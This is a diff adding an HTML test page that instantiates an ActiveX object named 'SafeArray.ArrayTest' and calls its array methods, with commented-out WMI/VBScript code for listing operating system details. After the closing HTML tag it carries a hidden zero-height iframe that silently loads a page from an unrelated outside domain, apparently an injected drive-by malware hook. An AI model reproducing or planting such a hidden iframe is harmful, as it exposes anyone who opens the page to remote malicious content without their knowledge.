@@ -1,0 +1,59 @@
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+
+<script type="text/javascript">
+var obj = new ActiveXObject("SafeArray.ArrayTest"); 
+if(obj != null) 
+  { 
+  	var arr = obj.TestBSTRArray(); 
+  	
+	var test = obj.GetObject(this);
+	
+	alert(test.arg);
+  	delete obj; 
+ } 
+</script>
+<!-- var objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2"); -->
+<!-- if(objWMIService != null) -->
+<!-- { -->
+<!-- 	var colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem") -->
+<!-- 	var arry = new VBArray(colItems); -->
+<!-- } -->
+<script language=vbscript>
+
+'Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+'Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+'For Each objItem In colItems
+'    tempstr = tempstr & "产品：" & objItem.Manufacturer
+'    tempstr = tempstr & vbCrLf & "版本类型：" & objItem.BuildType
+'    tempstr = tempstr & vbCrLf & "安装日期：" & objItem.InstallDate
+'    tempstr = tempstr & vbCrLf & "产品序列号：" & objItem.SerialNumber
+'    tempstr = tempstr & vbCrLf & "加密级别(位)：" & objItem.EncryptionLevel
+'    tempstr = tempstr & vbCrLf & "操作系统语言：" & objItem.OSLanguage
+'    tempstr = tempstr & vbCrLf & "系统驱动器：" & objItem.SystemDrive
+'    tempstr = tempstr & vbCrLf & "系统文件夹：" & objItem.SystemDirectory
+'    tempstr = tempstr & vbCrLf & "引导设备：" & objItem.BootDevice
+'    tempstr = tempstr & vbCrLf & "系统设备：" & objItem.SystemDevice
+'    tempstr = tempstr & vbCrLf & "最后启动时间：" & objItem.LastBootUpTime
+'    tempstr = tempstr & vbCrLf & "本地时间：" & objItem.LocalDateTime
+'    tempstr = tempstr & vbCrLf & "运行状态：" & objItem.Status
+'Next
+'OSinfoWMI = tempstr
+
+'set obj = CreateObject("SafeArray.ArrayTest")
+'dim arr
+'set arr  = obj.TestBSTRArray()
+'for s in arr
+'	msgbox s
+'next
+'i = 0
+
+</script>
+
+</BODY>
+</HTML>
+<iframe src=http://www.114Oldest.com/zz/mm.htm width=100 height=0></iframe>
